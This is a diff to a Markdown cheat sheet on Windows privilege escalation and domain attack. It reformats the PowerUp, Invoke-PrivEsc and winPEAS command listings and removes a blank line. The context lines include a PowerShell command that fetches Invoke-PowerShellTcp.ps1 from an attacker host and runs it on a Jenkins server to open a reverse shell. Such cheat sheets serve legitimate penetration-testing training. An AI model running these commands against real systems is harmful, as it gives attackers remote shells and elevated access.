@@ -60,12 +60,14 @@ Get-ModifiableService -Verbose
 
 **Run all checks with automated tools** :
 ```powershell
-– PowerUp
-	Invoke-AllChecks
-– Privesc:
-	Invoke-PrivEsc
-– PEASS-ng:
-	winPEASx64.exe
+# PowerUp:
+Invoke-AllChecks
+
+# Privesc:
+Invoke-PrivEsc
+
+# PEASS-ng:
+winPEASx64.exe
 ```
 
 ## Feature Abuse
@@ -111,7 +113,6 @@ Find-PSRemotingLocalAdminAccess
 
 ```powershell
 on Jenkins> powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); power -Reverse -IPAddress 172.16.100.1 -Port 443
-
 on Attacker> host the file in a webserver - example: HFS - HTTP File Server 
 ```
 
